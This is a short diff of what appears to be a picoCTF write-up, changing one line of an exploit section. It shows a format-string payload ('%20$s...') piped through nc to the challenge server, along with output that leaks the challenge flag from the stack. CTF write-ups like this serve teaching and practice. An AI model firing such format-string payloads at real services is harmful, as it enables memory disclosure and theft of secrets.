@@ -74,7 +74,7 @@ int main(int argc, char **argv){
 ## Exploit
 Payload: `%20$s%21$s%22$s%23$s%24$s%25$s%26$s`
 ```bash!
-python -c 'print("%20$s%21$s%22$s%23$s%24$s%25$s%26$s")' | nc saturn.picoctf.net 50811
+$ python -c 'print("%20$s%21$s%22$s%23$s%24$s%25$s%26$s")' | nc saturn.picoctf.net 50811
 Tell me a story and then I'll tell you one >> Here's a story -
 ������e�
         setresgidCTF{L34k1ng_Fl4g_0ff_St4ck_5e16d521}���̓ii
